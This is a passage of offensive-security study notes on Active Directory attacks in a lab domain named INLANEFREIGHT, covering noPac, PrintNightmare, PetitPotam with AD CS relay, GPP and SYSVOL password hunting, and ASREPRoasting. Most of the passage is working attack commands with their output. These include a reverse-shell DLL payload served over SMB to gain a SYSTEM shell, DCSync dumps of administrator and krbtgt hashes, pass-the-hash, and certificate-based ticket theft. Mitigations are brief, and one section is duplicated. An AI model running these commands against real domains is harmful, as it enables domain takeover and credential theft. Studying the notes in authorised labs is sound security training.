**Explanation:**
- The `.ccache` file can be used to perform a pass-the-ticket attack for further access such as DCSync.

---

### Using noPac to DCSync the Built-in Administrator Account

```bash
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

**Explanation:**
- `-dump` triggers a DCSync internally using `secretsdump.py`.
- `-just-dc-user INLANEFREIGHT/administrator` limits the dump to the administrator account only.
- A `.ccache` file is still created on disk — note this for cleanup.

---

### Windows Defender and SMBEXEC.py Considerations

If Windows Defender (or another AV/EDR) is enabled on the target, the shell session may be established but commands will likely fail. The first thing `smbexec.py` does is create a service called **BTOBTO**. Another service **BTOBO** is created for each command — each command is sent over SMB inside a `.bat` file called `execute.bat`. With each new command, a new batch script is created, echoed to a temp file, executed, and deleted. Windows Defender detects this as **VirTool:Win32/MSPSEexecCommand** (alert level: Severe).

> **Opsec note:** If being "quiet" is a priority, avoid `smbexec.py`-based tools like NoPac's `-shell` option. Use the `-dump` flag instead for DCSync without spawning a shell.

---

## 23.3 PrintNightmare — CVE-2021-34527 & CVE-2021-1675

PrintNightmare exploits vulnerabilities in the Windows **Print Spooler** service running on all Windows systems. The remote code execution variant can give an attacker a SYSTEM shell on a Domain Controller. Uses `cube0x0`'s exploit.

### Cloning the Exploit and Installing cube0x0's Impacket

```bash
$ git clone https://github.com/cube0x0/CVE-2021-1675.git

$ pip3 uninstall impacket
$ git clone https://github.com/cube0x0/impacket
$ cd impacket
$ python3 ./setup.py install
```

**Explanation:**
- This exploit requires **cube0x0's specific version of Impacket** — uninstall the standard version first.
- cube0x0's Impacket is pre-installed on the ATTACK01 host.

---

### Enumerating for MS-RPRN (Print Protocols)

```bash
$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

**Explanation:**
- Confirms that both print protocols are exposed on the target DC — the target is likely vulnerable.

---

### Generating a DLL Payload

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes
```

**Explanation:**
- `msfvenom` generates a 64-bit Windows reverse Meterpreter DLL payload.
- `LHOST` is our attack host IP; `LPORT` is the port our MSF listener will catch the callback on.

---

### Creating a Share with smbserver.py

```bash
$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

**Explanation:**
- `-smb2support` enables SMB2 support (required for modern Windows targets).
- Creates a share named `CompData` hosting the DLL file so the target DC can access it.

---

### Configuring and Starting MSF multi/handler

```bash
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 172.16.5.225
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080
```

**Explanation:**
- Configures a Metasploit multi/handler to catch the reverse shell when the DC executes the DLL.
- Must match the `LHOST`/`LPORT` values used in `msfvenom`.

---

### Running the Exploit

```bash
$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
<SNIP>
```

**Explanation:**
- Connects to the print spooler via `\PIPE\spoolss` and triggers the DC to load the DLL from our SMB share.
- The path format at the end of the command is `\\<attack host IP>\ShareName\payload.dll`.

---

### Getting the SYSTEM Shell

```bash
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048) at 2022-03-29 13:06:20 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**Explanation:**
- The Meterpreter session confirms SYSTEM-level access on the DC starting from just a standard domain user account.
- `whoami` confirms `nt authority\system` — full control of the Domain Controller.

---

## 23.4 PetitPotam (MS-EFSRPC) — CVE-2021-36942

PetitPotam coerces a Domain Controller to authenticate to an attacker-controlled host via NTLM over the MS-EFSRPC protocol. When AD CS is present, the relayed authentication requests a DC certificate from the CA, which is then used to request a TGT for the DC — enabling full domain compromise via DCSync.

There is also an executable version for Windows, and the trigger is available in Mimikatz (`misc::efs /server:<DC> /connect:<ATTACK HOST>`) and as `Invoke-PetitPotam.ps1`.

---

### Starting ntlmrelayx.py Targeting AD CS

```bash
$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
...
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server
[*] Servers started, waiting for connections
```

**Explanation:**
- Relays incoming NTLM authentication to the CA's Web Enrollment page to request a certificate.
- `--adcs` enables the AD CS relay attack mode.
- `--template DomainController` uses the Domain Controller certificate template.
- If the CA location is unknown, use a tool such as `certi` to locate it.

---

### Running PetitPotam.py (Coercing DC Authentication)

```bash
$ python3 PetitPotam.py 172.16.5.225 172.16.5.5

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Explanation:**
- First argument (`172.16.5.225`) is the attacker's host running `ntlmrelayx.py`.
- Second argument (`172.16.5.5`) is the target Domain Controller.
- Abuses `EfsRpcOpenFileRaw` via the LSARPC pipe to coerce DC authentication.
- `Attack worked!` confirms the DC was coerced successfully.

---

### Catching the Base64 Encoded Certificate for DC01

Back in the `ntlmrelayx.py` window, a successful relay produces a base64 certificate:

```bash
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$:
MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaD... <SNIP>
```

**Explanation:**
- The relay succeeds and `ntlmrelayx.py` requests a certificate for the DC machine account (`ACADEMY-EA-DC01$`) from the CA.
- The base64-encoded certificate is saved and used in the next step.

---

### Requesting a TGT Using gettgtpkinit.py

```bash
$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

INFO:minikerberos:Loading certificate and key from file
INFO:minikerberos:Requesting TGT
INFO:minikerberos:AS-REP encryption key (you might need this later):
INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
INFO:minikerberos:Saved TGT to file
```

**Explanation:**
- Uses **PKINIT** (certificate-based Kerberos pre-authentication) to exchange the certificate for a TGT for the DC machine account.
- Saves the TGT as `dc01.ccache`.
- **Save the AS-REP encryption key** (`70f805f...`) — needed for `getnthash.py` later.

---

### Setting the KRB5CCNAME Environment Variable

```bash
$ export KRB5CCNAME=dc01.ccache
```

**Explanation:**
- Tells Kerberos tools to use `dc01.ccache` for all authentication attempts.

---

### Using Domain Controller TGT to DCSync

```bash
$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

**Explanation:**
- `-k -no-pass` uses the Kerberos ticket from the `KRB5CCNAME` env variable (no password needed).
- Successfully dumps the administrator's NTLM hash via DCSync using the DC machine account's TGT.

---

### Running klist to Confirm the Ticket

```bash
$ klist

Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

**Explanation:**
- Confirms the TGT for `ACADEMY-EA-DC01$` is in the cache and valid.

---

### Confirming Admin Access to the Domain Controller

```bash
$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

SMB  172.16.5.5  445  ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

**Explanation:**
- Pass-the-Hash with the administrator's NT hash confirms full admin access to the DC — `(Pwn3d!)`.

---

### Submitting a TGS Request for Ourselves Using getnthash.py

An alternate route: using **getnthash.py** from PKINITtools to obtain the NT hash of the DC machine account via Kerberos U2U:

```bash
$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba
```

**Explanation:**
- `-key` takes the **AS-REP encryption key** saved from the `gettgtpkinit.py` output.
- Submits a TGS request with the PAC (Privilege Attribute Certificate) which contains the NT hash.
- The recovered NT hash can be used to DCSync directly using `-hashes`.

---

### Using Domain Controller NTLM Hash to DCSync

```bash
$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Cleanup...
```

**Explanation:**
- Uses the DC machine account's NT hash (`313b6f...`) with Pass-the-Hash to perform DCSync directly.

---

### Requesting TGT and Performing PTT with DC01$ Machine Account (Windows — Rubeus)

Alternatively, the base64 certificate can be used with Rubeus on a Windows attack host:

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$'
[*] Using domain controller: 172.16.5.5:88
[+] TGT request successful!
[+] Ticket successfully imported!

  ServiceName  :  krbtgt/INLANEFREIGHT.LOCAL
  UserName     :  ACADEMY-EA-DC01$
  StartTime    :  3/30/2022 3:50:25 PM
  EndTime      :  3/31/2022 1:50:25 AM
  RenewTill    :  4/6/2022 3:50:25 PM
  Flags        :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType      :  rc4_hmac
  ASREP (key)  :  2A621F62C32241F38FA68826E95521DD
```

**Explanation:**
- `asktgt` requests a TGT using PKINIT with the base64 certificate.
- `/ptt` injects the ticket directly into memory (Pass-the-Ticket).
- The `ASREP (key)` is also returned and can be used for `getnthash.py`.

> **Note:** You need the MS01 attack host (from Privileged Access or ACL Abuse sections) with the base64 certificate saved to perform this with Rubeus.

---

### Confirming the Ticket is in Memory (Windows)

```powershell
PS C:\Tools> klist

Cached Tickets: (3)

#0>  Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
     Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
     KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
     Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
     Cache Flags: 0x2 -> DELEGATION
     Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

**Explanation:**
- Three tickets are cached: a forwarded TGT, the primary TGT, and a CIFS service ticket.
- The DC machine account's TGT is now usable for further attacks.

---

### Performing DCSync with Mimikatz (After PetitPotam PTT)

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
Object RDN : krbtgt

** SAM ACCOUNT **
SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Password last change : 10/27/2021 8:14:34 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502

Credentials:
  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc
    lm  - 0: 4562458c201a97fa19365ce901513c21
```

**Explanation:**
- With the DC machine account TGT injected via pass-the-ticket, Mimikatz can DCSync against the domain.
- Targeting `krbtgt` retrieves the hash needed to create a **Golden Ticket** for persistence.
- Any privileged user's hash can be obtained the same way.

---

### PetitPotam Mitigations

- Apply the **CVE-2021-36942 patch** to all affected hosts immediately.
- Use **Extended Protection for Authentication** on CA Web Enrollment and Certificate Enrollment Web Service.
- Enable **Require SSL** on those services.
- **Disable NTLM authentication** for Domain Controllers.
- **Disable NTLM on AD CS servers** using Group Policy.
- **Disable NTLM for IIS** on AD CS servers where web enrollment services are in use.

> Applying only the CVE-2021-36942 patch is not sufficient for organizations running AD CS. An attacker with standard domain credentials can still attack AD CS in many instances. See the **"Certified Pre-Owned"** whitepaper for further hardening and detection guidance.

---

### Recap — Bleeding Edge Vulnerabilities

Three recent attacks were covered:
- **NoPac (SamAccountName Spoofing)** — requires standard domain user access
- **PrintNightmare (remote)** — requires standard domain user access
- **PetitPotam (MS-EFSRPC)** — requires **no authentication** at all

All three can lead to domain compromise relatively easily. When new attacks like these are released, build a small lab environment to practice them safely, so you are ready to use them effectively in real-world engagements. Understanding the setup also significantly improves your ability to explain the impact and remediation to clients. This was a brief glimpse into attacking AD CS — a topic that could fill an entire module.

---

### Request TGT Using the Certificate

```bash
$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
$ export KRB5CCNAME=dc01.ccache
$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

**Explanation:**
- `gettgtpkinit.py` uses PKINIT (certificate-based Kerberos pre-authentication) to exchange the certificate for a TGT for the DC machine account.
- `export KRB5CCNAME=dc01.ccache` sets the Kerberos ticket cache file so subsequent tools use this TGT.
- `secretsdump.py` with `-k -no-pass` uses the Kerberos ticket (no password needed) to perform DCSync and dump the administrator's hash.

### PetitPotam Mitigations

- Apply the CVE-2021-36942 patch immediately.
- Enable **Extended Protection for Authentication** on AD CS servers.
- Disable NTLM authentication on Domain Controllers and AD CS servers.
- Require SSL for Certificate Authority Web Enrollment and Certificate Enrollment Web Service.

---

# 24. Miscellaneous Misconfigurations

A broad understanding of AD's ins and outs helps us think outside the box and discover issues that others are likely to miss. This section covers many misconfigurations commonly found during real-world assessments.

> **Scenario Setup:** Move between Windows (MS01) and Linux (`172.16.5.225`, credentials `htb-student:HTB_@cademy_stdnt!`) attack hosts as needed.

---

## 24.1 Exchange Related Group Membership

A default installation of Microsoft Exchange (with no split-administration model) opens many attack vectors. Exchange is granted considerable privileges within the domain via users, groups, and ACLs.

- The group **Exchange Windows Permissions** is not a protected group, but members can **write a DACL to the domain object** — leveraged to grant DCSync privileges. Attackers can add accounts via DACL misconfiguration or a compromised Account Operators group member. Power users and support staff in remote offices are often added to this group.
- The **Organization Management** group (effectively Exchange's "Domain Admins") can access all domain user mailboxes. It has full control of the OU called **Microsoft Exchange Security Groups**, which contains Exchange Windows Permissions.
- Compromising an Exchange server often leads directly to Domain Admin. Dumping credentials from an Exchange server's memory can produce tens or hundreds of cleartext credentials or NTLM hashes — because users log in to **Outlook Web Access (OWA)** and Exchange caches their credentials in memory after login.

---

## 24.2 PrivExchange

The **PrivExchange** attack results from a flaw in the Exchange Server **PushSubscription** feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP. The Exchange service runs as **SYSTEM** and is over-privileged by default (has **WriteDacl** privileges on the domain pre-2019 Cumulative Update). This flaw can be relayed to LDAP to dump the domain NTDS database. If LDAP relay fails, it can relay to other hosts in the domain. This attack goes directly to Domain Admin with any authenticated domain user account.

---

## 24.3 Printer Bug (MS-RPRN)

The Printer Bug is a flaw in the **MS-RPRN** protocol (Print System Remote Protocol). This protocol defines communication of print job processing between a client and a print server. Any domain user can connect to the spool's named pipe using `RpcOpenPrinter` and force the server to authenticate over SMB to a client-specified host using `RpcRemoteFindFirstPrinterChangeNotificationEx`. The spooler runs as **SYSTEM** and is installed by default on Windows servers running Desktop Experience.

The attack can be used to:
- Relay to LDAP and grant the attacker account DCSync privileges.
- Relay LDAP authentication and grant **Resource-Based Constrained Delegation (RBCD)** privileges for a computer account under our control.
- Compromise a DC in a partner domain/forest (if Unconstrained Delegation is enabled and TGT delegation is allowed across the trust).

### Enumerating for MS-PRN Printer Bug

```powershell
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

**Explanation:**
- `Get-SpoolStatus` from `SecurityAssessment.ps1` queries the print spooler service on the specified computer.
- `Status: True` means the spooler is running and the host is potentially vulnerable.

---

## 24.4 MS14-068

This was a critical flaw in the **Kerberos protocol** that allowed standard domain users to elevate to Domain Admin using forged Kerberos tickets. A Kerberos ticket contains user info including account name, ID, and group membership in the **Privilege Attribute Certificate (PAC)**, signed by the KDC to prevent tampering. The vulnerability allowed a **forged PAC to be accepted as legitimate** by the KDC — enabling creation of a fake PAC claiming membership in Domain Administrators. Exploitable with **PyKEK** or Impacket. The only defense is patching. The Hack The Box machine **"Mantis"** demonstrates this vulnerability.

---

## 24.5 Sniffing LDAP Credentials

Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with **weak or default passwords**. Sometimes credentials are viewable in cleartext. Other times, the application has a **test connection function** — change the LDAP IP to the attacker's machine and set up a `netcat` listener on LDAP port 389. When the device tests the connection, it sends credentials to the attacker's machine, often in cleartext. Accounts used for LDAP connections are often privileged. In some cases, a full LDAP server may be needed to complete this attack.

---

## 24.6 Enumerating DNS Records with adidnsdump

By default, all authenticated AD users can list the child objects of a DNS zone in AD. Standard LDAP DNS queries don't return all results, but `adidnsdump` enumerates all records. This is especially helpful when hostnames are non-descriptive (e.g., `SRV01934.INLANEFREIGHT.LOCAL`) — DNS records may reveal friendly names like `JENKINS.INLANEFREIGHT.LOCAL` that help plan attacks.

### Using adidnsdump

```bash
$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5

Password:
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

### Viewing the Contents of the records.csv File

```bash
$ head records.csv

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
```

**Explanation:**
- Some records appear as `?,LOGISTICS,?` — unknown records with no resolved IP.
- Results are saved to `records.csv` for review.

### Using the -r Option to Resolve Unknown Records

```bash
$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

[+] Found 27 records
```

### Finding Hidden Records in the records.csv File

```bash
$ head records.csv

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
...
```

**Explanation:**
- `-r` performs A record queries to resolve the unknown entries — `LOGISTICS` now resolves to `172.16.5.240`.
- In larger environments this can uncover "hidden" hosts not found via BloodHound or other enumeration, leading to new attack targets.

---

## 24.7 Password in Description Field

Sensitive information such as account passwords are sometimes found in the **Description** or **Notes** fields of user accounts.

### Finding Passwords in the Description Field using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

**Explanation:**
- Filters all domain users for accounts with a non-null description field.
- The `ldap.agent` account has a plaintext password (`Sunsh1ne4All!`) stored directly in the description — a serious misconfiguration.
- For large domains, export to CSV with `| Export-Csv -Path ad_users_desc.csv -NoTypeInformation` for offline review.

---

## 24.8 PASSWD_NOTREQD Field

The `passwd_notreqd` field in the `userAccountControl` attribute means the account is **not subject to the current password policy** — they could have a shorter password or no password at all (if empty passwords are allowed). This flag may be set intentionally (admins not wanting out-of-hours calls) or accidentally, or by a vendor product during installation that never removed it. Just because the flag is set doesn't mean no password is set — just that one may not be required.

### Checking for PASSWD_NOTREQD Setting using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

**Explanation:**
- Several accounts have `PASSWD_NOTREQD` set — worth testing each for blank or weak passwords.
- Should always be reported to clients in a comprehensive assessment.

---

## 24.9 Credentials in SMB Shares and SYSVOL Scripts

The SYSVOL share is a **treasure trove** readable by all authenticated domain users. It contains batch, VBScript, and PowerShell scripts in the scripts directory. Always dig through this directory — old scripts may contain disabled accounts or old passwords; sometimes plaintext credentials for active accounts.

### Discovering an Interesting Script

```powershell
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/18/2021  10:44 AM            174 daily-runs.zip
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs
```

**Explanation:**
- `reset_local_admin_pass.vbs` is immediately interesting — it suggests this script resets a local admin password.

### Finding a Password in the Script

```powershell
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."

Set oShell = CreateObject("WScript.Shell")
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"

Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if

'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>
```

**Explanation:**
- The script contains a **plaintext password** (`!ILFREIGHT_L0cALADmin!`) for the built-in local Administrator on Windows hosts.
- Test if this password is still in use on domain hosts with: `crackmapexec smb <target> -u Administrator -p '!ILFREIGHT_L0cALADmin!' --local-auth`.

---

## 24.10 Group Policy Preferences (GPP) Passwords

When a new GPP is created, an `.xml` file is created in the SYSVOL share and cached locally on endpoints. Files that can contain passwords include: `drives.xml`, `printers.xml`, `services.xml`, `scheduledtasks.xml`, and GPPs used to change local admin passwords. The `cpassword` attribute is AES-256 encrypted, but Microsoft **published the AES private key on MSDN** — making it trivially decryptable by any domain user.

This was patched in **MS14-025** to prevent setting new GPP passwords, but the patch does **not** remove existing `Groups.xml` files. If the GPP policy is deleted instead of unlinked from the OU, the cached copy on local computers remains.

### Decrypting the Password with gpp-decrypt

```bash
$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

**Explanation:**
- `gpp-decrypt` takes the base64-encoded `cpassword` value from the `Groups.xml` file and decrypts it using the publicly known AES key.

### Locating and Retrieving GPP Passwords with CrackMapExec

```bash
$ crackmapexec smb -L | grep gpp

[*] gpp_autologin    Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password     Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

**Explanation:**
- CrackMapExec has two GPP modules: `gpp_password` finds and decrypts `cpassword` values; `gpp_autologin` searches for autologon credentials in `Registry.xml`.

### Using CrackMapExec's gpp_autologin Module

```bash
$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
GPP_AUTO...  [+] Found SYSVOL share
GPP_AUTO...  [*] Searching for Registry.xml
GPP_AUTO...  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO...  [+] Found credentials in Registry.xml
GPP_AUTO...  Usernames: ['guarddesk']
GPP_AUTO...  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO...  Passwords: ['ILFreightguardadmin!']
```

**Explanation:**
- Discovers autologon credentials for the `guarddesk` account stored in `Registry.xml` in SYSVOL.
- This account likely logs in automatically at boot for a shared workstation — probably a local admin.
- GPP passwords are often for legacy accounts; even if the account is locked or expired, **always attempt password spraying internally** — password re-use is widespread.

---

## 24.11 ASREPRoasting

It is possible to obtain the **Ticket Granting Ticket (TGT)** for any account that has the **"Do not require Kerberos pre-authentication"** setting enabled. Many vendor installation guides specify this for service accounts. With pre-authentication, a user enters their password which encrypts a timestamp — the DC decrypts this to validate. If pre-auth is disabled, an attacker can request authentication data for that account and retrieve an encrypted TGT from the DC, then crack it offline.

ASREPRoasting is similar to Kerberoasting but attacks the **AS-REP** instead of the **TGS-REP**. An SPN is not required. If an attacker has **GenericWrite** or **GenericAll** over an account, they can enable this attribute, obtain the AS-REP hash, crack it, then disable the attribute again.

### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

